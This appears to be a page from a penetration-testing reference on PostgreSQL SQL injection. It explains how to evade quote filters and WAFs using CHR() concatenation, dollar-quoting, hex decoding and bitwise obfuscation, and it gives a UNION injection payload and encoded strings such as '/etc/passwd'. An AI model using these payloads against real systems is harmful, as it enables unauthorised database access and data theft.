---
title: Avoiding Quotations
description: Techniques to avoid using quotes in PostgreSQL injection
category: Injection Techniques
order: 10
tags: ["quotes", "evasion", "bypass"]
lastUpdated: 2025-12-16
---

## Avoiding Quotations

In some scenarios, web applications may implement filters that block or sanitize quotation marks (`'` or `"`). These techniques allow you to construct strings without using quotes.

### Using CHR() Function

The `CHR()` function converts ASCII values to characters:

```sql
-- 'admin' using CHR()
SELECT CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110);
-- Result: 'admin'

-- Build any string character by character
SELECT CHR(65);  -- 'A'
SELECT CHR(66);  -- 'B'
```

### Using String Concatenation

Combine `CHR()` with the `||` concatenation operator:

```sql
-- Build 'root' without quotes
SELECT CHR(114)||CHR(111)||CHR(111)||CHR(116);

-- Complex strings
SELECT CHR(47)||CHR(101)||CHR(116)||CHR(99)||CHR(47)||CHR(112)||CHR(97)||CHR(115)||CHR(115)||CHR(119)||CHR(100);
-- Result: '/etc/passwd'
```

### Using Dollar-Quoting

PostgreSQL supports dollar-quoting as an alternative to single quotes:

```sql
-- Instead of 'admin'
SELECT $$admin$$;

-- With custom tag
SELECT $tag$admin$tag$;

-- This can bypass simple quote filters
SELECT * FROM users WHERE username = $$admin$$;
```

### Using Hexadecimal

PostgreSQL can convert hex to text:

```sql
-- Using encode/decode
SELECT convert_from(decode('61646d696e', 'hex'), 'UTF8');
-- Result: 'admin'

-- Using E'\x' escape syntax
SELECT E'\x61\x64\x6d\x69\x6e';
-- Result: 'admin'
```

### Using ASCII and CHR Functions

`ASCII()` expects text input and returns its numeric code, while `CHR()` does the reverse—producing a text character from a numeric code. You can avoid explicit quotes by composing `ASCII(CHR(...))`.

```sql
-- Get ASCII value without quotes (CHR produces the character)
SELECT ASCII(CHR(65));  -- Returns 65

-- Convert ASCII value back to character
SELECT CHR(65);  -- Returns 'A'
```

### Using Bitwise Operations for Obfuscation

Bitwise operators can obscure numeric ASCII values to evade pattern-based WAFs:

```sql
-- XOR: 65 XOR 255 XOR 255 = 65 (double XOR restores original)
SELECT CHR(65 # 255 # 255);  -- Returns 'A'

-- OR: Build 65 from bit components (64 | 1 = 65)
SELECT CHR(64 | 1);  -- Returns 'A' (0x40 | 0x01)

-- Shift: 130 >> 1 = 65 (right shift divides by 2)
SELECT CHR(130 >> 1);  -- Returns 'A'

-- Combined: Build 'admin' with mixed operations
SELECT CHR(96 | 1) || CHR(50 << 1) || CHR(218 >> 1) || CHR(52 << 1 | 1) || CHR(110 # 0);
-- 97='a', 100='d', 109='m', 105='i', 110='n'
```

**Operators:** `&` (AND), `|` (OR), `#` (XOR), `~` (NOT), `<<` (left shift), `>>` (right shift)

### Injection Examples

```sql
-- Original query using quotes
SELECT * FROM users WHERE username='admin';

-- Using CHR() to avoid quotes
SELECT * FROM users WHERE username=CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110);

-- Using dollar-quoting
SELECT * FROM users WHERE username=$$admin$$;

-- In UNION injection
' UNION SELECT NULL,CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110),NULL--
```

### Building Common Strings

| String        | CHR() Equivalent                                                                                                               |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| `admin`       | `CHR(97)\|\|CHR(100)\|\|CHR(109)\|\|CHR(105)\|\|CHR(110)`                                                                      |
| `root`        | `CHR(114)\|\|CHR(111)\|\|CHR(111)\|\|CHR(116)`                                                                                 |
| `/etc/passwd` | `CHR(47)\|\|CHR(101)\|\|CHR(116)\|\|CHR(99)\|\|CHR(47)\|\|CHR(112)\|\|CHR(97)\|\|CHR(115)\|\|CHR(115)\|\|CHR(119)\|\|CHR(100)` |

### Notes

- PostgreSQL's `CHR()` function is similar to MySQL's `CHAR()` string function
- Dollar-quoting is PostgreSQL-specific and very useful for bypass
- The `||` operator is used for concatenation (not `+` or `CONCAT()`)
- These techniques are useful for bypassing WAFs and quote filters
